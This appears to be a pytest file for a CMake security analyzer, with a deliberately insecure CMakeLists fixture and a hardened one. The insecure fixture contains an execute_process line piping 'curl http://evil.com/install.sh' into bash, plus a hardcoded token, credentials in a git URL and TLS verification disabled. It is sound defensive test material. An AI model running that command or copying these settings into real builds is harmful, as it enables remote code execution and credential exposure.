"""Tests for CMakeAnalyzer."""

from pathlib import Path

from devai.cmake_analyzer import CMakeAnalyzer, CMakeFinding


INSECURE_CMAKELISTS = """\
cmake_minimum_required(VERSION 3.16)
project(insecure-demo)

set(API_TOKEN "hardcoded-secret-token-12345")
set(CMAKE_TLS_VERIFY OFF)

include(FetchContent)
FetchContent_Declare(
  mylib
  GIT_REPOSITORY https://user:pass@github.com/private/deps.git
  GIT_TAG main
)

file(DOWNLOAD
  http://insecure.example.com/archive.tar.gz
  ${CMAKE_BINARY_DIR}/archive.tar.gz
)

execute_process(
  COMMAND sh -c "curl http://evil.com/install.sh | bash"
  WORKING_DIRECTORY ${CMAKE_SOURCE_DIR}
)

add_compile_options(-fno-stack-protector)
"""

HARDENED_CMAKELISTS = """\
cmake_minimum_required(VERSION 3.16)
project(secure-demo)

find_package(OpenSSL REQUIRED)

include(FetchContent)
FetchContent_Declare(
  mylib
  GIT_REPOSITORY https://github.com/org/mylib.git
  GIT_TAG v1.2.3
)
FetchContent_MakeAvailable(mylib)

file(DOWNLOAD
  https://example.com/archive.tar.gz
  ${CMAKE_BINARY_DIR}/archive.tar.gz
  EXPECTED_HASH SHA256=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
)
"""


class TestCMakeAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = CMakeAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_cmakelists(self, tmp_path: Path):
        (tmp_path / "CMakeLists.txt").write_text(HARDENED_CMAKELISTS, encoding="utf-8")
        analyzer = CMakeAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "CMakeLists.txt").write_text(INSECURE_CMAKELISTS, encoding="utf-8")
        analyzer = CMakeAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "tls_verify_off" in kinds
        assert analyzer.health_score() < 100.0

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "CMakeLists.txt").write_text(HARDENED_CMAKELISTS, encoding="utf-8")
        analyzer = CMakeAnalyzer(str(tmp_path))
        assert analyzer.stats.findings == 0
        assert analyzer.health_score() == 100.0

    def test_detects_cmake_module(self, tmp_path: Path):
        cmake_dir = tmp_path / "cmake"
        cmake_dir.mkdir()
        (cmake_dir / "Deps.cmake").write_text(
            'set(DEPLOY_PASSWORD "secret-123")\n',
            encoding="utf-8",
        )
        (tmp_path / "CMakeLists.txt").write_text(
            "cmake_minimum_required(VERSION 3.16)\nproject(test)\n",
            encoding="utf-8",
        )
        analyzer = CMakeAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "cmake/Deps.cmake" for f in findings)

    def test_generate_hardened_config(self):
        analyzer = CMakeAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "CMAKE_TLS_VERIFY ON" in config
        assert "EXPECTED_HASH" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "CMakeLists.txt").write_text(INSECURE_CMAKELISTS, encoding="utf-8")
        analyzer = CMakeAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "CMake analysis:" in context
        assert "health score:" in context

    def test_finding_format(self):
        finding = CMakeFinding(
            kind="test",
            severity="high",
            message="test message",
            path="CMakeLists.txt",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert "CMakeLists.txt:1" in finding.format()
